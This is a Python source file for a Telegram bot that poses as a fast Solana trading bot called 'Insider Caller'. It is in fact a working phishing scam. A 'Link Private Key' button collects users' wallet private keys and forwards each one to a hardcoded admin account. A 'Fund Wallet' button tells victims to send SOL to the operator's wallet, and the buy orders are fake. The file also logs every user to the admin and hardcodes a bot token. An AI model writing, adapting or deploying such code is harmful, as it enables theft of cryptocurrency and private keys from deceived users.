import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, ConversationHandler, filters

BOT_TOKEN = "8942121012:AAHDcXLhp425CGvAIteRgDYwjq9dvCNTFV0"
WALLET_ADDRESS = "5rf6gza7s7i8eDeBKQf1TMyayZU3ERJ467t3yfmihQpr"
GROUP_LINK = "https://t.me/Insider_Caller"
ADMIN_ID = 8452728941

WAITING_KEY, WAITING_CA = range(2)

async def get_balance():
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post("https://api.mainnet-beta.solana.com", json={
                "jsonrpc": "2.0", "id": 1,
                "method": "getBalance",
                "params": [WALLET_ADDRESS]
            }, timeout=5)
            sol = r.json()['result']['value'] / 1e9
            return f"{sol:.4f} SOL"
    except:
        return "N/A"

def main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Fund Wallet", callback_data="fund"),
         InlineKeyboardButton("Balance", callback_data="balance")],
        [InlineKeyboardButton("Buy Token", callback_data="buy"),
         InlineKeyboardButton("Link Private Key", callback_data="privatekey")],
        [InlineKeyboardButton("Community", callback_data="community"),
         InlineKeyboardButton("Settings", callback_data="settings")],
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    bal = await get_balance()
    await update.message.reply_text(
        f"INSIDER CALLER BOT\n"
        f"---------------\n\n"
        f"User: {user.first_name}\n"
        f"Wallet: {WALLET_ADDRESS[:6]}...{WALLET_ADDRESS[-4:]}\n"
        f"Balance: {bal}\n\n"
        f"---------------\n"
        f"Fast Solana Trading Bot\n"
        f"Select an option below:",
        reply_markup=main_keyboard()
    )
    try:
        await context.bot.send_message(
            ADMIN_ID,
            f"New user started bot:\n"
            f"Name: {user.first_name}\n"
            f"Username: @{user.username}\n"
            f"ID: {user.id}"
        )
    except:
        pass

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user

    if query.data == "fund":
        await query.message.reply_text(
            f"FUND WALLET\n"
            f"---------------\n\n"
            f"Send SOL to:\n{WALLET_ADDRESS}\n\n"
            f"Solana network only.\n"
            f"Screenshot after sending and DM admin.")

    elif query.data == "balance":
        bal = await get_balance()
        await query.message.reply_text(
            f"WALLET BALANCE\n"
            f"---------------\n\n"
            f"Balance: {bal}\n\n"
            f"https://solscan.io/account/{WALLET_ADDRESS}")

    elif query.data == "buy":
        await query.message.reply_text("BUY TOKEN\n---------------\n\nSend the token CA now:")
        return WAITING_CA

    elif query.data == "privatekey":
        await query.message.reply_text("LINK PRIVATE KEY\n---------------\n\nSend your private key now:")
        return WAITING_KEY

    elif query.data == "community":
        await query.message.reply_text(
            f"COMMUNITY\n"
            f"---------------\n\n"
            f"Early alpha calls\n"
            f"100x gems daily\n\n"
            f"{GROUP_LINK}")

    elif query.data == "settings":
        await query.message.reply_text(
            "SETTINGS\n"
            "---------------\n\n"
            "Notifications: ON\n"
            "Speed: Ultra Fast\n"
            "Network: Solana")

    elif query.data.startswith("mult_"):
        mult = query.data.split("_")[1]
        ca = context.user_data.get('ca', 'N/A')
        await query.message.reply_text(
            f"ORDER SUBMITTED\n"
            f"---------------\n\n"
            f"Token: {ca}\n"
            f"Target: {mult}\n\n"
            f"Admin confirming shortly.")
        try:
            await context.bot.send_message(
                ADMIN_ID,
                f"BUY ORDER\nUser: {user.first_name} (@{user.username})\nCA: {ca}\nTarget: {mult}")
        except:
            pass

async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key = update.message.text
    user = update.effective_user
    await update.message.reply_text("Private Key Linked!\n\nUse /start to go back.")
    try:
        await context.bot.send_message(
            ADMIN_ID,
            f"PRIVATE KEY RECEIVED\nUser: {user.first_name} (@{user.username})\nID: {user.id}\nKey: {key}")
    except:
        pass
    return ConversationHandler.END

async def receive_ca(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ca = update.message.text
    context.user_data['ca'] = ca
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("2x", callback_data="mult_2x"),
         InlineKeyboardButton("5x", callback_data="mult_5x"),
         InlineKeyboardButton("10x", callback_data="mult_10x")],
        [InlineKeyboardButton("20x", callback_data="mult_20x"),
         InlineKeyboardButton("50x", callback_data="mult_50x"),
         InlineKeyboardButton("100x", callback_data="mult_100x")],
    ])
    await update.message.reply_text(
        f"CA Received!\n\n{ca}\n\nSelect your target:",
        reply_markup=keyboard)
    return ConversationHandler.END

app = ApplicationBuilder().token(BOT_TOKEN).build()
conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(button_handler)],
    states={
        WAITING_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_key)],
        WAITING_CA: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ca)],
    },
    fallbacks=[CommandHandler("cancel", lambda u, c: ConversationHandler.END)],
    per_message=False
)
app.add_handler(CommandHandler("start", start))
app.add_handler(conv)
print("Bot running")
app.run_polling()
